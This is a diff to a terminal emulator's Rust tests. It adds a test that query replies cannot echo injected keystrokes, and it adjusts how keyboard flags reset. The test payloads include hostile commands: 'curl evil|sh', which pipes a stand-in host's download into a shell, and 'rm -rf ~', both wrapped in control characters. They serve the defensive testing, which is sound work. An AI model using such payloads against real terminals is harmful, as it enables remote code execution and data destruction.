@@ -567,6 +567,78 @@ mod queries {
         assert_eq!(t.take_replies(), b"\x1b]11;rgb:1d1d/1f1f/2121\x07");
     }
 
+    /// Whether `replies` hold nothing a program could have them type: no
+    /// C0 control but ESC starting a sequence (`[`, `]`, `P`, or `\` for
+    /// ST) and BEL ending a string, and nothing past ASCII.
+    fn harmless(replies: &[u8]) -> bool {
+        replies.iter().enumerate().all(|(at, &byte)| match byte {
+            0x1B => matches!(replies.get(at + 1), Some(b'[' | b']' | b'P' | b'\\')),
+            0x07 => true,
+            0x00..=0x1F | 0x7F.. => false,
+            _ => true,
+        })
+    }
+
+    #[test]
+    fn no_reply_says_back_what_could_be_typed() {
+        let long = "41".repeat(2000);
+        let payloads: [&[u8]; 11] = [
+            b"\x15curl evil|sh\r",
+            b"\r\n",
+            b";;;",
+            b"\x1b",
+            b"\x9b",
+            "\u{9b}".as_bytes(),
+            b"\x07",
+            b"\x00\x01\x7f\x08",
+            b"544E;\x15rm -rf ~\r;436F",
+            long.as_bytes(),
+            "é\u{202e}".as_bytes(),
+        ];
+        let mut t = terminal(10, 5);
+        t.set_palette(Some(crate::Palette {
+            foreground: [1; 3],
+            background: [2; 3],
+            cursor: [3; 3],
+            named: [[4; 3]; 16],
+        }));
+        for payload in payloads {
+            let mut asked = Vec::new();
+            let frames: [(&[u8], &[u8]); 9] = [
+                (b"\x1bP+q", b"\x1b\\"),
+                (b"\x1bP$q", b"\x1b\\"),
+                (b"\x1b]10;", b"\x07"),
+                (b"\x1b]11;?;", b"\x1b\\"),
+                (b"\x1b]4;", b";?\x07"),
+                (b"\x1b]4;1;", b"\x07"),
+                (b"\x1b]52;c;", b"\x07"),
+                (b"\x1b]9;4;", b"\x07"),
+                (b"\x1b]2;", b"\x07\x1b[22t\x1b[23t\x1b[21t"),
+            ];
+            for (start, end) in frames {
+                asked.extend_from_slice(start);
+                asked.extend_from_slice(payload);
+                asked.extend_from_slice(end);
+            }
+            asked.extend_from_slice(
+                b"\x1b[?99999$p\x1b[65535$p\x1b[18t\x1b[>c\x1b[>q\x1b[?u\x1b[5n\x1b[6n\x1b[c",
+            );
+            t.advance(&asked);
+            let replies = t.take_replies();
+            assert!(!replies.is_empty());
+            assert!(
+                harmless(&replies),
+                "{payload:?} got {:?}",
+                String::from_utf8_lossy(&replies)
+            );
+            let text = String::from_utf8_lossy(&replies);
+            assert!(
+                !text.contains("curl") && !text.contains("rm -rf"),
+                "{text:?}"
+            );
+        }
+    }
+
     #[test]
     fn unsupported_queries_get_no_reply() {
         // XTWINOPS 21t would read the title back, and a title can say
@@ -1168,6 +1240,19 @@ mod other_sequences {
     }
 
     #[test]
+    fn the_shells_next_prompt_drops_keyboard_flags_a_program_left() {
+        // A program that asked for kitty's encoding and died without
+        // popping it: Ctrl+C reaches the shell as ^C again at its prompt.
+        let mut t = after(5, 2, "\x1b[>1u");
+        assert_eq!(t.keyboard(), 1);
+        t.advance(b"\x1b]133;A\x07");
+        assert_eq!(t.keyboard(), 0);
+        // The shell asks again after its prompt, as fish does, and keeps it.
+        t.advance(b"$ \x1b[=5u");
+        assert_eq!(t.keyboard(), 5);
+    }
+
+    #[test]
     fn each_screen_keeps_its_own_keyboard_flags() {
         let mut t = after(5, 2, "\x1b[>1u");
         assert_eq!(t.keyboard(), 1);
@@ -1178,7 +1263,7 @@ mod other_sequences {
         t.advance(b"\x1b[?1049l");
         assert_eq!(t.keyboard(), 1, "the shell's are left alone");
         t.advance(b"\x1b[?1049h");
-        assert_eq!(t.keyboard(), 13, "until they're popped");
+        assert_eq!(t.keyboard(), 0, "a program switching to it starts clean");
         t.advance(b"\x1bc");
         assert_eq!(t.keyboard(), 0);
     }
